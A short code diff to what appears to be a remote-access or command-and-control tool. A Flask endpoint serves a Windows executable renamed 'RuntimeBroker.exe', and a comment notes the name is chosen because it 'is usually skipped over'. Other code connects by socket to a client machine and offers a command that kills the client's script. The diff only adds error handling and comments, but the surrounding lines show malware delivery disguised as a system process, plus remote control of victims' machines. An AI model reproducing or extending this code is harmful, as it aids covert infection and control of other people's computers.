@@ -7,6 +7,10 @@ from time import sleep
 log = logging.getLogger('werkzeug')
 log.disabled = True
 
+"""
+TODO: make plugin 
+"""
+
 class colors:
     """
     Module made by @venaxyt on Github
@@ -69,7 +73,7 @@ class EndpointAction(object):
             except ImportError:
                 print("[!] flask needed for this")
                 return
-                
+
             # MOST JANK SHIT IVE DONE
             return send_file('./dist/rs-windows.exe', download_name='RuntimeBroker.exe', as_attachment=True) # RuntimeBroker.exe is usually skipped over
 
@@ -281,6 +285,10 @@ while True:
                 mainSock.connect((clientIP, int(clientP))) # connect to client
             except socket.gaierror: # failed to connect
                 print("[!] client ip doesnt exist")
+                return
+            except ConnectionRefusedError:
+                print("[!] machine active, but was unable to connect")
+                return
 
             print("connected; use \"alpine!die\" to full exit client's script; use ctrl+c to leave\n") # didnt fail
 
